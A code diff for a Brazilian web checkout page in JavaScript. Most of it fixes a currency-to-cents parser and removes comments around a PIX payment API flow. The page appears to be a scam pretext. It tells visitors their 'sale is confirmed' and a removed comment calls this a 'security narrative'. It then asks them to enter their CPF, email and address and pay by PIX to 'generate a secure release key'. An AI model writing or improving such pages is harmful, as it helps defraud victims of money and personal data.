@@ -139,7 +139,7 @@ function initAdminApp() {
 }
 
 // ========================================================
-// 🛍️ CLIENT APP (REFATORADO: FORM REAL DE CHECKOUT)
+// 🛍️ CLIENT APP (CORRIGIDO: Conversão de Valores)
 // ========================================================
 async function initClientApp(id) {
   const containerArea = document.getElementById('client-content-area');
@@ -161,11 +161,26 @@ async function initClientApp(id) {
       return isCurrency ? `R$ ${formatted}` : formatted;
   }
 
-  // Parse de moeda para centavos (Integração API)
-  const parseMoneyToCents = (valStr) => {
-    if(!valStr) return 0;
-    const clean = String(valStr).replace(/\D/g, ''); // Remove tudo que não é número
-    return parseInt(clean, 10); 
+  // 🔥 FIX CRÍTICO: Conversão Robusta de Moeda para API
+  const parseMoneyToCents = (val) => {
+    if (!val) return 0;
+    
+    // Caso 1: O Google mandou um número puro (ex: 20)
+    if (typeof val === 'number') {
+        return Math.round(val * 100);
+    }
+
+    let valStr = String(val).trim();
+
+    // Caso 2: String numérica sem formatação BR (ex: "20" ou "20.50")
+    if (!valStr.includes(',') && !valStr.includes('R$')) {
+        return Math.round(parseFloat(valStr) * 100);
+    }
+
+    // Caso 3: Formatação BR (ex: "R$ 20,00" ou "20,00")
+    // Remove tudo que não é dígito -> "2000"
+    const clean = valStr.replace(/\D/g, '');
+    return parseInt(clean, 10);
   };
 
   const criarElemento = (tag, attrs = {}, inner = '') => {
@@ -205,7 +220,6 @@ async function initClientApp(id) {
     const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); 
     const content = criarElemento('div', { class: 'content' });
 
-    // HTML do Topo (Narrativa de Segurança)
     content.innerHTML = `
       <div style="text-align: center; margin-bottom: 20px;">
           <h2 style="color: #00bfa5; margin: 0;">🎉 Venda Confirmada!</h2>
@@ -226,8 +240,6 @@ async function initClientApp(id) {
       <p style="font-size: 13px; opacity: 0.7; margin-bottom: 15px;">Preencha os dados abaixo para gerar a chave segura de liberação.</p>
     `;
 
-    // FORMULÁRIO REAL (INJETADO AQUI)
-    // Nota: Removido "Banco" e "Pix". Adicionado CPF, Email e Endereço (Necessários para API Invictus)
     const formHtml = `
       <form id="checkoutForm">
         <div class="checkout-grid">
@@ -256,14 +268,15 @@ async function initClientApp(id) {
                  <label>Número</label>
                  <input type="text" name="number" required placeholder="Nº">
             </div>
-             <div class="form-group full-width" style="display:none"> 
+            
+            <div class="form-group full-width" style="display:none"> 
                 <input type="text" name="street_name" id="inputRua" required placeholder="Rua">
                 <input type="text" name="neighborhood" id="inputBairro" required placeholder="Bairro">
                 <input type="text" name="city" id="inputCidade" required placeholder="Cidade">
                 <input type="text" name="state" id="inputUf" required placeholder="UF">
             </div>
             <div class="full-width" id="address-preview" style="font-size:11px; color:#00bfa5; display:none; margin-top:-10px; margin-bottom:10px;">
-               </div>
+            </div>
         </div>
 
         <button type="submit" id="btnPay" class="btn-pay" style="width: 100%; margin-top: 20px; padding: 15px; background-color: #00bfa5; border: none; border-radius: 8px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer;">
@@ -273,7 +286,6 @@ async function initClientApp(id) {
       </form>
     `;
     
-    // Injeta o formulário no container
     const formContainer = criarElemento('div');
     formContainer.innerHTML = formHtml;
     content.appendChild(formContainer);
@@ -282,13 +294,12 @@ async function initClientApp(id) {
     container.appendChild(criarElemento('div', { class: 'footer' }, '&copy; 2025 Plataforma Segura. Todos os direitos reservados.'));
     containerArea.appendChild(container);
 
-    // --- LÓGICA DO FORMULÁRIO ---
+    // LÓGICA DO FORMULÁRIO
     const form = document.getElementById('checkoutForm');
     const btnPay = document.getElementById('btnPay');
     const inputCep = document.getElementById('inputCep');
     const msgEnvio = document.getElementById('msgEnvio');
 
-    // Autocomplete de Endereço via CEP (UX Booster)
     inputCep.addEventListener('blur', async () => {
         const cep = inputCep.value.replace(/\D/g, '');
         if (cep.length === 8) {
@@ -309,7 +320,6 @@ async function initClientApp(id) {
         }
     });
 
-    // Submit -> API Invictus
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       
@@ -320,7 +330,6 @@ async function initClientApp(id) {
       const customerData = {};
       formData.forEach((value, key) => customerData[key] = value);
 
-      // Garante que campos ocultos tenham valor (fallback simples)
       if(!customerData.street_name) customerData.street_name = "Rua Geral";
       if(!customerData.neighborhood) customerData.neighborhood = "Centro";
       if(!customerData.city) customerData.city = "São Paulo";
@@ -349,12 +358,12 @@ async function initClientApp(id) {
 
   } catch (err) {
     console.error(err);
-    renderError('Erro de conexão. Verifique sua internet.');
+    containerArea.innerHTML = `<div style="text-align:center; padding:40px; color:#ff4d4d;"><h2>Erro ao carregar. Tente novamente.</h2></div>`;
   }
 }
 
 // ========================================================
-// 📡 API & MODAL HANDLER (Lógica Invictus Pay)
+// 📡 API & MODAL HANDLER
 // ========================================================
 async function executeInvictusApi(method, path, payload, button, msgElement) {
     const originalText = button.innerHTML;
@@ -371,7 +380,6 @@ async function executeInvictusApi(method, path, payload, button, msgElement) {
         const data = await response.json();
 
         if (response.ok) {
-            // Sucesso!
             if (data.payment_method === 'pix' && data.pix && data.pix.pix_qr_code) {
                 if(msgElement) msgElement.textContent = "";
                 showPixModal(data);
@@ -379,7 +387,6 @@ async function executeInvictusApi(method, path, payload, button, msgElement) {
                 alert("Erro: API não retornou dados de PIX.");
             }
         } else {
-            // Erro API
             console.error("Erro API Invictus:", data);
             const errorMsg = data.errors ? Object.values(data.errors).flat().join('\n') : (data.message || "Dados inválidos.");
             alert("Atenção:\n" + errorMsg);
@@ -404,7 +411,6 @@ function showPixModal(data) {
     const btnCopy = document.getElementById('copyPixButton');
     const btnClose = document.getElementById('closeModalButton');
 
-    // Preencher dados
     const valBrl = (data.amount / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
     amountEl.textContent = valBrl;
     hashEl.textContent = `Protocolo: ${data.hash}`;
@@ -417,10 +423,8 @@ function showPixModal(data) {
         qrContainer.style.display = 'none';
     }
 
-    // Abrir Modal
     modal.classList.add('is-visible');
 
-    // Eventos
     const closeModal = () => modal.classList.remove('is-visible');
     
     btnClose.onclick = closeModal;
@@ -428,7 +432,6 @@ function showPixModal(data) {
 
     btnCopy.onclick = () => {
         textarea.select();
-        // Fallback mobile
         textarea.setSelectionRange(0, 99999);
         document.execCommand('copy');
         
